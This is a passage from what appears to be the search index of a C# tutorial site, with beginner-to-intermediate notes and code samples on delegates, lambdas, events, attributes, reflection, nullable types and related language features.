implementations","text":"<p>The same method can have different behaviors depending on the object using it.</p> <pre><code>class Animal // Parent or base class\n{\n    public virtual void MakeSound() { Console.WriteLine(\"Some sound...\"); }\n}\n\nclass Bird : Animal // Child or derived class\n{\n    public override void MakeSound() { Console.WriteLine(\"Chirp Chirp!\"); }\n}\n\nclass Dog : Animal // Child or derived class\n{\n    public override void MakeSound() { Console.WriteLine(\"Woof Woof!\"); }\n}\n\nAnimal myBird = new Bird();\nAnimal myDog = new Dog();\nmyBird.MakeSound(); // Outputs: \"Chirp Chirp!\"\nmyDog.MakeSound();  // Outputs: \"Woof Woof!\"\n</code></pre> <p>Another example of polymorphism are interfaces which are completely <code>abstract classes</code> that only contain method <code>signatures</code>. It's more of a contract showing what the object should be about, how you implement them is up to you.</p> <p>Interfaces should always start with I, it's an unspoken rule.</p> <pre><code>interface IAnimal \n{\n  void animalSound(); // interface method (does not have a body)\n}\n\n// Pig \"implements\" the IAnimal interface\nclass Pig : IAnimal \n{\n  public void animalSound() \n  {\n    // The body of animalSound() is provided here\n    Console.WriteLine(\"The pig says: wee wee\");\n  }\n}\n\nclass Program \n{\n  static void Main(string[] args) \n  {\n    IAnimal somePig = new Pig();  // Create a Pig object using the interface\n    Pig myPig = new Pig();  // Create a Pig object\n    myPig.animalSound();\n  }\n}\n</code></pre>"},{"location":"CSharp/Level1/Preprocessor_Directives/","title":"Preprocessor directives","text":"<p>Preprocessor directives are instructions that tell the compiler how to process the source code before actual compilation begins. They do not produce executable code but instead <code>control how the compiler treats parts of the code</code>.</p> <p>Think of them as the control-flow of the compilation and not of the actual code.</p> Directive Description <code>#define</code> Defines a symbol (not a variable). <code>#undef</code> Undefines a previously defined symbol. <code>#if</code>, <code>#elif</code>, <code>#else</code>, <code>#endif</code> Conditionally includes/excludes code. <code>#region</code>, <code>#endregion</code> Organizes code into collapsible sections. <code>#error</code> Forces a compilation error with a custom message. <code>#warning</code> Issues a compiler warning with a custom message. <code>#pragma</code> Provides special compiler instructions (e.g., disabling warnings). <code>#line</code> Modifies compiler line numbers for debugging. <p>Example of usage: <pre><code>class Program\n{\n    #region Initialization\n    static void Initialize()\n    {\n        Console.WriteLine(\"Initializing...\");\n    }\n    #endregion\n\n    #region Cleanup\n    static void Cleanup()\n    {\n        Console.WriteLine(\"Cleaning up...\");\n    }\n    #endregion\n}\n</code></pre></p>"},{"location":"CSharp/Level2/Delegates/","title":"Delegates","text":"<p>A delegate is like a <code>function pointer in C or C++</code>, meaning it can store <code>references to methods</code> and call them dynamically.</p> <p>There are three steps involved while working with delegates: 1. Declare a delegate type (defines the method signature). 2. Assign a method to the delegate. 3. Call the delegate just like a method.</p> <p><pre><code>// 1. Declare a delegate\npublic delegate void MyDelegate(string msg);\n\n// 2. Create a target method matching the delegate signature\nstatic void MethodA(string message) //Notice how the function parameters match the delegate signature.\n{\n\n    Console.WriteLine(message);\n}\n\n// 3. Assign the method to the delegate and invoke it\n//Instantiation &amp; referencing\nMyDelegate del = new MyDelegate(MethodA);\n// or \nMyDelegate del = MethodA; \n// or set lambda expression \nMyDelegate del = (string msg) =&gt;  Console.WriteLine(msg);\n\n//Invocation\ndel.Invoke(\"Hello World!\");\n// or \ndel(\"Hello World!\");\n</code></pre> </p>"},{"location":"CSharp/Level2/Delegates/#passing-delegates","title":"Passing delegates","text":"<p>You can even pass a delegate as an argument to another method.</p> <pre><code>static void InvokeDelegate(MyDelegate del) // MyDelegate type parameter\n    {\n        del(\"Hello World\");\n    }\n</code></pre>"},{"location":"CSharp/Level2/Delegates/#multicast-delegate","title":"Multicast Delegate","text":"<p>The delegate can <code>point to multiple methods</code>. A delegate that points multiple methods is called a multicast delegate.</p> <p>This is done by adding functions to an invocation list using operators: - <code>+</code>, add a function to the list - <code>+=</code>, add a function to the list - <code>-</code>, remove a function from the list - <code>-=</code>, remove a function from the list</p> <pre><code>class Program\n{\n    static void Main(string[] args)\n    {\n        MyDelegate del1 = ClassA.MethodA;\n        MyDelegate del2 = ClassB.MethodB;\n        MyDelegate del = del1 + del2; // combines del1 + del2\n        MyDelegate del3 = (string msg) =&gt; Console.WriteLine(\"Called lambda expression: \" + msg);\n        del += del3; // combines del1 + del2 + del3\n        del = del - del2; // removes del2\n        del -= del1 // removes del1\n    }\n}\n</code></pre>"},{"location":"CSharp/Level2/Delegates/#generic-delegates","title":"Generic delegates","text":"<p>A generic delegate can be defined the same way as a delegate but using generic type parameters or return type. The generic type must be specified when you set a target method.</p> <pre><code>public delegate T add&lt;T&gt;(T param1, T param2); // generic delegate\n</code></pre>"},{"location":"CSharp/Level2/Delegates/#built-in-generic-delegates-func-action-and-predicate","title":"Built-in generic delegates: <code>Func</code>, <code>Action</code> And <code>Predicate</code>","text":"<p>Whenever we use delegates, we have to declare a delegate, initialize it, and then call a method with a reference variable.</p> <ul> <li><code>Func</code> delegate takes zero or more parameters, <code>returns a value</code>.</li> <li><code>Action</code> takes zero or more parameters, is <code>void</code>.</li> <li><code>Predicate</code>  takes zero or more parameters, returns <code>bool</code>.</li> </ul> <pre><code>Func&lt;int, int, int&gt; add = (a, b) =&gt; a + b;  // Takes two ints, returns an int\nAction&lt;string&gt; print = message =&gt; Console.WriteLine(message);  // Takes a string, returns void\nPredicate&lt;int&gt; isEven = num =&gt; num % 2 == 0;  // Takes an int, returns bool\n</code></pre>"},{"location":"CSharp/Level2/Delegates/#anonymous-methods","title":"Anonymous methods","text":"<p>An anonymous method is a method without a name. Instead of defining a separate named method, you can <code>define an inline method directly inside a delegate</code>.</p> <pre><code>public delegate void Greet(string name);\n\nstatic void Main()\n{\n    Greet greet = delegate (string name) \n    { \n        Console.WriteLine(\"Hello, \" + name); \n    };\n\n    greet(\"Alice\");  // Output: Hello, Alice\n}\n</code></pre> <p>Limitations of anonymous methods: - No reusability - No jump statements like goto, break or continue. - No ref or out parameters of an outer method. - No access unsafe code. - Cannot be used on the left side of the is operator.</p>"},{"location":"CSharp/Level2/Delegates/#use-cases-of-delegates","title":"Use cases of delegates","text":"<ul> <li>Event Handling (e.g., Button Click in UI apps).</li> <li>Callbacks (executing a method after another completes).</li> <li>LINQ &amp; Functional Programming (higher-order functions).</li> <li>Strategy Pattern &amp; Custom Logic Switching.</li> </ul>"},{"location":"CSharp/Level2/Expression_Bodies/","title":"Expression-Bodied Members","text":"<p>Expression-bodied members are a <code>shorter way to write methods and properties</code> when they only have one line of code. Instead of <code>{ }</code>, you use <code>=&gt;</code> (fat arrow).</p> <p>Expression-Bodied <code>Lambda</code>: <pre><code>(int x, int y) =&gt; x + y;\n</code></pre></p> <p>Expression-Bodied <code>Methods</code>: When a method only returns a single value, you can <code>skip { } and return</code>. <pre><code>public int Add(int x, int y) =&gt; x + y;\n</code></pre></p> <p>Expression-Bodied <code>Properties</code>: Shortcut for <code>read-only properties</code> (only get, no set) <pre><code>public int MyProperty =&gt; 42;  // Always returns 42\n</code></pre></p> <p>Expression-Bodied <code>Indexers</code>: Used when a class acts like an array. <pre><code>public int this[int index] =&gt; index * 2;\n</code></pre></p> <p>Expression-Bodied <code>Constructors</code>: Short way to set a value in a constructor <pre><code>public MyClass(string name) =&gt; Name = name;\n</code></pre></p> <p>Same as: <pre><code>public MyClass(string name) \n{\n    Name = name;\n}\n</code></pre></p>"},{"location":"CSharp/Level2/Extension_Methods/","title":"Extension Methods","text":"<p>Extension methods allow you to add new methods to existing classes, structs, or interfaces without modifying their original code. This is super useful if you need to add functionality to a class but can't change its definition (like with classes from libraries or the .NET framework).</p> <p>You can \"extend\" an existing class by writing a new method outside of the class, and it will behave like it\u2019s part of the original class.</p> <p>To create an extension method: - You must define it inside a static class. - The first parameter of the method must be the type you're extending, and it should be prefixed with the this keyword.</p> <pre><code>namespace ExtensionMethods\n{\n    public static class IntExtensions\n     {\n        public static bool IsGreaterThan(this int i, int value)\n        {\n            return i &gt; value;\n        }\n    }\n}\n\n//Use case\nint i = 10;\nbool result = i.IsGreaterThan(100);\n</code></pre>"},{"location":"CSharp/Level2/Generics/","title":"Generics","text":"<p>Generics allow you to write a class or method that can work with any data type. Much like templates in C++.</p> <pre><code>//Define generic class\nclass DataStore&lt;T&gt; //T is commonly used but this could be anything.\n{\n    //Define generic field\n    public T Data { get; set; }\n\n    //Define generic method\n    public void Print&lt;T&gt;(T data)\n    {\n        Console.WriteLine(data);\n    }\n}\n\n//Instantiating generic class\nDataStore&lt;string&gt; dataStore = new DataStore&lt;string&gt;();\n\n//Call generic method\ndataStore.Print&lt;int&gt;(100);\n</code></pre>"},{"location":"CSharp/Level2/Indexers/","title":"Indexers","text":"<p>An indexer is a special kind of property that allows you to access an object as if it were an array, even though it's a custom class or struct. It enables the use of the square bracket <code>[]</code> syntax for getting or setting values within an object.</p>"},{"location":"CSharp/Level2/Indexers/#what-does-it-do","title":"What does it do?","text":"<p>An indexer allows you to treat your class like an array or collection. It lets you get or set values from a collection inside the object using an index, just like you would with an array.</p> <p>Recap: - Indexers allow you to use the [] syntax for accessing elements inside a class or struct. - They work like properties, but with an index parameter. - Indexers can be defined to access any internal collection like arrays, lists, or dictionaries inside the class.</p> <pre><code>public class MyClass\n{\n    private int[] numbers = { 1, 2, 3, 4, 5 };\n\n    public int this[int index]  // Indexer definition\n    {\n        get\n        {\n            return numbers[index];  // Return value at the given index\n        }\n        set\n        {\n            numbers[index] = value;  // Set value at the given index\n        }\n    }\n}\n</code></pre>"},{"location":"CSharp/Level2/Lambda/","title":"Lambda","text":"<p>A lambda expression is just a <code>shortcut for writing small functions</code> without naming them.</p> <p>Since lambda expressions are the opposite of named methods they're also called <code>anonymous functions</code>, often confused with anonymous delegate methods.</p> <p>Instead of writing this: <pre><code>int MultiplyByFive(int num)\n{\n    return num * 5;\n}\n</code></pre></p> <p>You can write: <pre><code>num =&gt; num * 5;\n</code></pre></p> <p>This means: 1. Take an input num 2. Multiply it by 5 3. Return the result</p> <p>The lambda expression <code>does not execute on its own</code>. Instead, we use it inside other methods, variables or delegates.</p> <pre><code>Func&lt;int, int&gt; multiply = num =&gt; num * 5;\nConsole.WriteLine(multiply(3));  // Output: 15\n// or\nAction&lt;string&gt; greet = name =&gt; Console.WriteLine(\"Hello, \" + name);\ngreet(\"Alice\");  // Output: Hello, Alice\n</code></pre>"},{"location":"CSharp/Level2/Lambda/#two-types-of-lambdas","title":"Two Types of Lambdas","text":"<p>Expression Lambda: Expression lambda contains a single expression in the lambda body. <pre><code>(num) =&gt; num * 5;\n</code></pre></p> <p>Statement Lambda: Statement lambda encloses one or more statements in the lambda body. We use curly braces <code>{ }</code> to wrap the statements. <pre><code>(num) =&gt; \n{\n    int result = num * 5;\n    return result;\n};\n</code></pre></p> <p>Key Differences:</p> Feature Expression Lambda Statement Lambda Syntax Complexity Simple (single expression) Supports multiple statements Implicit Return Yes (return type inferred) No (must use explicit <code>return</code>) Suitable for Short, single-line logic Complex logic requiring multiple lines Readability High for simple computations Better for structured, complex behavior"},{"location":"CSharp/Level2/Lambda/#use-cases","title":"Use cases","text":"<ol> <li>Writing Easy and Simple Delegate Code.</li> <li>Performing quick and simple calculations.</li> <li>We can pass a lambda expression as a parameter in a method call.</li> </ol> <p>Syntax recap: (parameterList) =&gt; lambda body - <code>parameterList</code> - list of input parameters - <code>=&gt;</code> - a lambda operator - <code>lambda body</code> - can be an expression or statement</p>"},{"location":"CSharp/Level2/Method_hiding/","title":"Method Hiding","text":"<p>When a derived class defines a method with the same name as a method in the base class <code>without using virtual and override</code>, the derived method hides the base method instead of overriding it. This is called <code>method hiding</code>.</p> <p>Example: <pre><code>class Person\n{\n    public void Greet() \n    {\n        Console.WriteLine(\"Hi! I am a person.\");\n    }\n}\n\nclass Employee : Person\n{\n    public void Greet() \n    {\n        Console.WriteLine(\"Hello! I am an employee.\");\n    }\n}\n\nclass Program\n{\n    static void Main()\n    {\n        Person p1 = new Person();\n        p1.Greet(); // Calls Person.Greet()\n\n        Person p2 = new Employee();\n        p2.Greet(); // Still calls Person.Greet() (not Employee.Greet())\n\n        Employee emp = new Employee();\n        emp.Greet(); // Calls Employee.Greet()\n    }\n}\n</code></pre></p> <p>Output: <pre><code>Hi! I am a person.\nHi! I am a person.\nHello! I am an employee.\n</code></pre></p> <ul> <li>Even though Employee has its own Greet() method, <code>Person p2 = new Employee();</code> still calls <code>Person.Greet() instead of Employee.Greet()</code>.</li> <li>This happens <code>because Greet() is not virtual</code>, so method resolution is based on the type of reference (Person or Employee) rather than the actual object type.</li> </ul>"},{"location":"CSharp/Level2/Method_hiding/#intended-method-hiding-using-the-new-keyword","title":"Intended method hiding using the <code>new</code> Keyword","text":"<p>If we intend to hide the base class method, we should use the <code>new</code> keyword. This tells the compiler that we are aware of the hiding behavior and prevents warnings.</p> <p>Example: <pre><code>class Person\n{\n    public void Greet()\n    {\n        Console.WriteLine(\"I am a person!\");\n    }\n}\n\nclass Employee : Person\n{\n    public new void Greet() // Hides the base class method\n    {\n        Console.WriteLine(\"I am the Manager!\");\n    }\n}\n\nclass Program\n{\n    static void Main()\n    {\n        Person p1 = new Person();\n        p1.Greet(); // Calls Person.Greet()\n\n        Person p2 = new Employee();\n        p2.Greet(); // Still calls Person.Greet() because p2 is of type Person\n\n        Employee emp = new Employee();\n        emp.Greet(); // Calls Employee.Greet()\n    }\n}\n</code></pre></p> <p>Output: <pre><code>I am a person!\nI am a person!\nI am the Manager!\n</code></pre></p> <ul> <li>The new keyword explicitly tells the compiler that we are hiding the base method (removes warnings).</li> <li>Even with new, the base method is still called when using a base class reference (<code>Person p2 = new Employee();</code>).</li> <li>A derived class reference (<code>Employee emp = new Employee();</code>) calls the derived class method.</li> </ul>"},{"location":"CSharp/Level2/Nullable_Types/","title":"Nullable value types","text":"<p>Some value types (like int, float, bool, etc.) cannot have a <code>null</code> value by default. However, sometimes you might want to represent the absence of a value, especially when working with databases or optional fields.</p> <p>To allow value types to hold null, C# provides nullable value types using <code>?</code>: <pre><code>int? age = null;  // Nullable int\ndouble? price = 99.99;  // Nullable double\nbool? isAvailable = null;  // Nullable bool\n</code></pre></p>"},{"location":"CSharp/Level2/Nullable_Types/#how-it-works-internally","title":"How it works internally","text":"<p>A nullable value type (<code>T?</code>) is actually a struct called <code>Nullable&lt;T&gt;</code>. This struct has two properties:</p> <p><code>HasValue</code> \u2013 Returns true if the variable has a value. <code>Value</code> \u2013 Retrieves the actual value if HasValue is true.</p> <p><pre><code>[Serializable]\npublic struct Nullable&lt;T&gt; where T : struct\n{        \n    public bool HasValue { get; }\n\n    public T Value { get; }\n\n    // other implementation\n}\n</code></pre> Think about this: <code>int? i = null;</code> is the same as <code>nullable&lt;int&gt; i = null;</code>.</p>"},{"location":"CSharp/Level2/Nullable_Types/#null-coalescing-operator","title":"Null-Coalescing Operator (<code>??</code>)","text":"<p>Instead of checking HasValue, you can provide a default value using <code>??</code>:</p> <pre><code>int? count = null;\nint result = count ?? 0;  // If count is null, assign 0\nConsole.WriteLine(result); // Output: 0\n</code></pre>"},{"location":"CSharp/Level2/Nullable_Types/#null-conditional-operator","title":"Null-Conditional Operator (<code>?.</code>)","text":"<p>You can also use null-conditional access (<code>?.</code>) to safely handle nullable types:</p> <pre><code>int? length = null;\nConsole.WriteLine(length?.ToString()); // Doesn't throw error, just prints empty\n</code></pre>"},{"location":"CSharp/Level2/Nullable_Types/#explicitly-converting-nullable-to-non-nullable","title":"Explicitly Converting Nullable to Non-Nullable","text":"<p>If you directly assign a nullable type to a non-nullable type, it will cause a compilation error unless you explicitly handle null cases. <pre><code>int? nullableNumber = null;\nint nonNullableNumber = nullableNumber ?? -1; // Assign -1 if null\n</code></pre></p>"},{"location":"CSharp/Level2/Operator_Overloading/","title":"Operator Overloading","text":"<p>You can redefine or overload most of the built-in operators available in C#. Thus a programmer can use operators with user-defined types as well. Overloaded operators are functions with special names the keyword <code>operator</code>.</p> <p>Basically, you are specifying how a operator should \"calculate\" or manipulate the data of a certain object. <pre><code>public static Box operator+ (Box b, Box c)\n{\n   Box box = new Box();\n   box.length = b.length + c.length;\n   box.breadth = b.breadth + c.breadth;\n   box.height = b.height + c.height;\n   return box;\n}\n</code></pre></p>"},{"location":"CSharp/Level2/Partials/","title":"Partials","text":"<p>Partials allows us to split up \"definitions\" into multiple files. When compiled, the compiler combines all parts into a single class file.</p>"},{"location":"CSharp/Level2/Partials/#partial-classes","title":"Partial classes","text":"<ul> <li>When working on large classes, allowing multiple developers to work on different parts.</li> <li>When using auto-generated code (e.g., UI frameworks like WPF, WinForms, Blazor).</li> <li>To organize related methods in separate files while keeping them under the same class.</li> </ul> <p>Person.cs: <pre><code>public partial class Person\n{\n    public string FirstName { get; set; }\n    public string LastName { get; set; }\n\n    public void PrintFullName()\n    {\n        Console.WriteLine($\"{FirstName} {LastName}\");\n    }\n}\n</code></pre></p> <p>Person_2.cs: <pre><code>public partial class Person\n{\n    public int Age { get; set; }\n\n    public void PrintAge()\n    {\n        Console.WriteLine($\"Age: {Age}\");\n    }\n}\n</code></pre></p>"},{"location":"CSharp/Level2/Partials/#partial-methods","title":"Partial methods","text":"<p>A partial method is a method that is <code>declared</code> (much like <code>forward declarations in C++</code>) in one part of a partial class and optionally implemented in another part. If no implementation is provided, the compiler removes the declaration.</p> <ul> <li>Must be in a partial class</li> <li>Must return void (cannot return a value)</li> <li>Cannot have access modifiers (public, private, etc.)</li> <li>Cannot be virtual, abstract, or override</li> <li>Must be partial in both declaration and implementation</li> </ul> <p>User_Declaration.cs: <pre><code>public partial class User\n{\n    public string Name { get; set; }\n\n    partial void OnNameChanged(); // Partial method declaration\n\n    public void ChangeName(string newName)\n    {\n        Name = newName;\n        OnNameChanged(); // Calls the method if implemented\n    }\n}\n</code></pre></p> <p>User_Definition.cs: <pre><code>public partial class User\n{\n    partial void OnNameChanged()\n    {\n        Console.WriteLine($\"Name changed to: {Name}\");\n    }\n}\n</code></pre></p>"},{"location":"CSharp/Level2/Pass_By_Reference/","title":"Pass by reference","text":"<p>The <code>ref</code> and <code>out</code> keywords are used to <code>pass arguments by reference</code> to functions or methods. This means that any <code>changes made to the parameters inside the function will affect the original values outside the function</code>. </p> <p>While both of them allow you to modify the arguments, there are key differences in how and when they are used.</p>"},{"location":"CSharp/Level2/Pass_By_Reference/#ref","title":"ref","text":"<p>Used to indicate that a parameter is passed by reference, and it <code>must be initialized before being passed</code> into the method. </p> <p>Key Points: - The parameter must be initialized before it is passed to the method. - Any changes made to the parameter inside the method will be reflected outside the method. - It allows for both reading and writing the parameter inside the method.</p> <p>Example of ref: <pre><code>using System;\n\npublic class RefExample\n{\n    public static void ModifyValue(ref int number)\n    {\n        // Modifying the passed parameter\n        number += 10;\n    }\n\n    public static void Main()\n    {\n        int x = 5;\n        Console.WriteLine(\"Before: \" + x);  // Output: Before: 5\n\n        // Passing x by reference\n        ModifyValue(ref x);\n\n        Console.WriteLine(\"After: \" + x);  // Output: After: 15\n    }\n}\n</code></pre></p>"},{"location":"CSharp/Level2/Pass_By_Reference/#out","title":"out","text":"<p>Similar to ref, but there are a few key differences: - The parameter <code>does not need to be initialized before being passed</code> to the method. It is used primarily when you want the method to <code>assign a value to the parameter</code>, and you <code>don't care about its initial value</code>. The parameter is <code>considered uninitialized</code> until assigned a value inside the method. - The method must assign a value to the parameter <code>before it returns</code>. - It is used to return multiple values from a method.</p> <pre><code>using System;\n\npublic class OutExample\n{\n    public static void Divide(int numerator, int denominator, out int result)\n    {\n        if (denominator == 0)\n        {\n            result = 0; // Assigning a value when the denominator is 0\n        }\n        else\n        {\n            result = numerator / denominator;\n        }\n    }\n\n    public static void Main()\n    {\n        int result;\n\n        // Passing the result variable without initializing it\n        Divide(10, 2, out result);\n        Console.WriteLine(\"Result: \" + result);  // Output: Result: 5\n\n        Divide(10, 0, out result);\n        Console.WriteLine(\"Result: \" + result);  // Output: Result: 0\n    }\n}\n</code></pre>"},{"location":"CSharp/Level2/Tuples/","title":"Tuples","text":"<p>A data structure that contains a sequence of elements of different data types. A tuple can have elements from 1 to 8 types. If try to add elements greater than eight, then the compiler will throw an error. </p> <pre><code>Tuple&lt;int, string, string&gt; person = new Tuple()&lt;int, string, string&gt;(1, \"Steve\", \"Jobs\");\n</code></pre> <p>There are many ways to use tuples: <pre><code>public (string, int) GetStringAndInt()\n{\n    string resultString = \"Hello\";\n    int resultInt = 42;\n    return (resultString, resultInt);\n}\n</code></pre> <pre><code>(int Id, string FirstName, string LastName) person = (1, \"Bill\", \"Gates\");\nperson.Id;   // returns 1\nperson.FirstName;  // returns \"Bill\"\nperson.LastName; // returns \"Gates\"\n</code></pre></p>"},{"location":"CSharp/Level3/Attributes_Reflection/","title":"Attributes","text":"<p>Attributes are <code>special markers (metadata)</code> that you can attach to classes, methods, properties, etc., to <code>provide extra information about them</code>. They <code>don\u2019t change how the code runs</code> but help at runtime or compile-time.</p> <p>Think of them like stickers or labels on your code that provide instructions to the compiler or runtime. You add attributes above the code element you want to annotate, using square brackets <code>[ ]</code> like so: <pre><code>// Here, [Obsolete] tells the compiler to warn when someone tries to use OldMethod.\n[Obsolete(\"This method is outdated, use NewMethod instead\")]\nvoid OldMethod() {\n    Console.WriteLine(\"This is old.\");\n}\n</code></pre></p>"},{"location":"CSharp/Level3/Attributes_Reflection/#predefined-or-built-in-attributes","title":"Predefined or Built-in Attributes","text":"<ul> <li> <p><code>Obsolete</code>: Marks something as outdated</p> <pre><code>[Obsolete(\"Use NewMethod instead\", true)]  // true = treat as error\nvoid OldMethod() {}\n</code></pre> </li> <li> <p><code>Conditional</code>: Runs code only in specific conditions (like Debug mode)</p> <pre><code>#define DEBUG\nusing System;\nusing System.Diagnostics;\n\npublic class MyClass\n{\n    [Conditional(\"DEBUG\")]\n    public static void DebugMessage(string msg) {\n        Console.WriteLine(msg);\n    }\n}\n</code></pre> </li> <li> <p><code>AttributeUsage</code>: Controls where an attribute can be applied</p> <pre><code>[AttributeUsage(AttributeTargets.Method | AttributeTargets.Class)]\nclass MyCustomAttribute : Attribute {}\n</code></pre> </li> </ul>"},{"location":"CSharp/Level3/Attributes_Reflection/#user-defined-attributes","title":"User-defined Attributes","text":"<p>You can create your own attributes by inheriting from <code>System.Attribute</code>.</p> <p>Let\u2019s say for example that we want to track bugs in our code: <pre><code>[AttributeUsage(AttributeTargets.Class | AttributeTargets.Method, AllowMultiple = true)]\npublic class BugInfo : Attribute {\n    public int BugID { get; }\n    public string Developer { get; }\n    public string LastReview { get; }\n\n    public BugInfo(int bugID, string developer, string lastReview) {\n        BugID = bugID;\n        Developer = developer;\n        LastReview = lastReview;\n    }\n}\n</code></pre></p> <p>Now, we can use this on a class or method: <pre><code>[BugInfo(101, \"Alice\", \"2024-03-06\")]\nclass MyProgram {}\n\n[BugInfo(202, \"Bob\", \"2024-02-28\")]\nvoid FixBug() {}\n</code></pre></p> <p>At runtime, we can read this attribute using Reflection (a way to examine metadata): <pre><code>Type type = typeof(MyProgram);\nforeach (var attr in type.GetCustomAttributes(false)) {\n    BugInfo bug = (BugInfo)attr;\n    Console.WriteLine($\"Bug {bug.BugID}, Reported by {bug.Developer}, Last Reviewed: {bug.LastReview}\");\n}\n</code></pre></p>"},{"location":"CSharp/Level3/Attributes_Reflection/#reflection","title":"Reflection","text":"<p>Imagine you have a toolbox that allows you to peek inside your own C# program while it\u2019s running. This tool is called <code>Reflection</code>, it is found in the <code>System.Reflection</code> namespace and it helps you:</p> <ul> <li>View attribute information at runtime (like metadata on classes/methods).</li> <li>Examine types inside an assembly (which means analyzing a compiled .exe or .dll).</li> <li>Use \"late binding\" (calling methods/properties on objects without knowing them at compile time).</li> <li>Create and use new types dynamically (useful in frameworks and dependency injection).</li> <li>See details about classes, methods, and properties at runtime</li> <li>Modify and interact with objects dynamically</li> <li>Work with attributes (extra data attached to classes/methods)</li> </ul> <p>Again, define a Custom Attribute: <pre><code>using System;\n\n// Define a custom attribute\n[AttributeUsage(AttributeTargets.Class)] // Only for classes\npublic class HelpAttribute : Attribute \n{\n    public string Url { get; } // Read-only property\n\n    public HelpAttribute(string url) // Constructor sets the URL\n    {\n        Url = url;\n    }\n}\n\n// Apply the custom attribute to a class\n[Help(\"https://docs.microsoft.com/en-us/dotnet/csharp/\")]\nclass MyClass { }\n</code></pre></p> <p>Read the Attribute Using Reflection: <pre><code>using System;\nusing System.Reflection;\n\nclass Program\n{\n    static void Main()\n    {\n        // Get type information of MyClass\n        Type type = typeof(MyClass);\n\n        // Retrieve attributes applied to MyClass\n        object[] attributes = type.GetCustomAttributes(false);\n\n        foreach (var attribute in attributes)\n        {\n            if (attribute is HelpAttribute help)\n            {\n                Console.WriteLine($\"Help URL: {help.Url}\");\n            }\n        }\n    }\n}\n</code></pre></p> <p>Output: <code>Help URL: https://docs.microsoft.com/en-us/dotnet/csharp/</code></p>"},{"location":"CSharp/Level3/Events/","title":"Events","text":"<p>An event is a <code>notification sent by an object to signal the occurrence of an action</code>.</p> <p>In C#, an event is an <code>encapsulated delegate</code>. It is dependent on the delegate. The delegate defines the signature for the event handler method of the subscriber class.</p>"},{"location":"CSharp/Level3/Events/#observer-design-pattern","title":"Observer design-pattern","text":"<ul> <li>The class who raises events is called Publisher.</li> <li>The class who receives the notification is called Subscriber.</li> </ul> <p>{: .warning }</p> <p>There can be multiple subscribers of a single event. Typically, a publisher raises an event when some action occurred. The subscribers, who are interested in getting a notification when an action occurred, should register with an event and handle it.</p> <p></p>"},{"location":"CSharp/Level3/Events/#declare-an-event","title":"Declare an event","text":"<p>An event can be declared in two steps: 1. Declare a delegate. 2. Declare a variable of the delegate with event keyword.</p>"},{"location":"CSharp/Level3/Events/#publisher-class","title":"Publisher class","text":"<pre><code>public delegate void Notify();  //Delegate, specifies the signature for the ProcessCompleted event handler. It specifies that the event handler method in subscriber class must have a void return type and no parameters.\n\npublic class ProcessBusinessLogic //Publisher\n{\n    public event Notify ProcessCompleted; //Event\n\n}\n\npublic void StartProcess()\n{\n    Console.WriteLine(\"Process Started!\");\n    // some code here..\n    OnProcessCompleted(); //Raise the event\n}\n\nprotected virtual void OnProcessCompleted() //Protected virtual method\n{\n    //If ProcessCompleted is not null then call delegate\n    ProcessCompleted?.Invoke(); //The ? means: if(ProcessCompleted != null)\n}\n</code></pre>"},{"location":"CSharp/Level3/Events/#subscriber-class","title":"Subscriber class","text":"<p>The subscriber class must register to ProcessCompleted event and handle it with the method whose signature matches Notify delegate, as shown below.</p> <pre><code>class Program\n{\n    public static void Main()\n    {\n        ProcessBusinessLogic bl = new ProcessBusinessLogic();\n        bl.ProcessCompleted += bl_ProcessCompleted; // register with / subscribe to an event\n        bl.StartProcess();\n    }\n\n    // event handler\n    public static void bl_ProcessCompleted()\n    {\n        Console.WriteLine(\"Process Completed!\");\n    }\n}\n</code></pre>"},{"location":"CSharp/Level3/Events/#another-simplified-example","title":"Another simplified example","text":"<pre><code>public class Subject\n{\n    public delegate void Notify();\n    public event Notify Observers;\n\n    public void ChangeState()\n    {\n        Console.WriteLine(\"State changed!\");\n        Observers?.Invoke(); // Notify all observers\n    }\n}\n\npublic class Observer\n{\n    public void OnStateChange() =&gt; Console.WriteLine(\"Observer notified!\");\n}\n</code></pre>"},{"location":"CSharp/Level3/Events/#built-in-eventhandler-delegate","title":"Built-in EventHandler Delegate","text":"<p>.NET Framework includes built-in delegate types <code>EventHandler</code> and <code>EventHandler&lt;TEventArgs&gt;</code> for the most common events. Typically, any event should include two parameters: the source of the event and event data. Use the EventHandler delegate for all events that do not include event data. </p> <pre><code>// declaring an event using built-in EventHandler\npublic event EventHandler ProcessCompleted;\n\npublic void StartProcess()\n{\n    Console.WriteLine(\"Process Started!\");\n    // some code here..\n    OnProcessCompleted(EventArgs.Empty); //No event data\n}\n\nprotected virtual void OnProcessCompleted(EventArgs e)\n{\n    ProcessCompleted?.Invoke(this, e);\n}\n</code></pre>"},{"location":"CSharp/Level3/Events/#passing-event-data","title":"Passing event data","text":"<p>Most events send some data to the subscribers. The EventArgs class is the base class for all the event data classes. .NET includes many built-in event data classes such as SerialDataReceivedEventArgs. It follows a naming pattern of ending all event data classes with EventArgs. You can create your custom class for event data by deriving EventArgs class.</p> <pre><code>class Program\n{\n    public static void Main()\n    {\n        ProcessBusinessLogic bl = new ProcessBusinessLogic();\n        bl.ProcessCompleted += bl_ProcessCompleted; // register with an event\n        bl.StartProcess();\n    }\n\n    // event handler\n    public static void bl_ProcessCompleted(object sender, bool IsSuccessful)\n    {\n        Console.WriteLine(\"Process \" + (IsSuccessful? \"Completed Successfully\": \"failed\"));\n    }\n}\n\npublic class ProcessBusinessLogic\n{\n    // declaring an event using built-in EventHandler\n    public event EventHandler&lt;bool&gt; ProcessCompleted; \n\n    public void StartProcess()\n    {\n        try\n        {\n            Console.WriteLine(\"Process Started!\");\n\n            // some code here..\n\n            OnProcessCompleted(true);\n        }\n        catch(Exception ex)\n        {\n            OnProcessCompleted(false);\n        }\n    }\n\n    protected virtual void OnProcessCompleted(bool IsSuccessful)\n    {\n        ProcessCompleted?.Invoke(this, IsSuccessful);\n    }\n}\n</code></pre>"},{"location":"CSharp/Level3/Events/#user-defined-eventargs","title":"User-defined EventArgs","text":"<pre><code>class ProcessEventArgs : EventArgs\n{\n    public bool IsSuccessful { get; set; }\n    public DateTime CompletionTime { get; set; }\n}\n</code></pre>"},{"location":"CSharp/Level3/IDisposable/","title":"The <code>IDisposable</code> interface","text":"<p><code>IDisposable</code> is an interface that allows you to <code>release unmanaged resources</code> like files, database connections, network sockets, etc., when an object is no longer needed.</p> <p>The C# Garbage Collector (<code>GC</code>) automatically cleans up managed resources (like objects in memory). However, GC does NOT clean up unmanaged resources (like file handles, database connections, sockets, etc.).</p> <p>IDisposable ensures proper cleanup by providing a Dispose() method. Ideally this avoids any memory leaks of 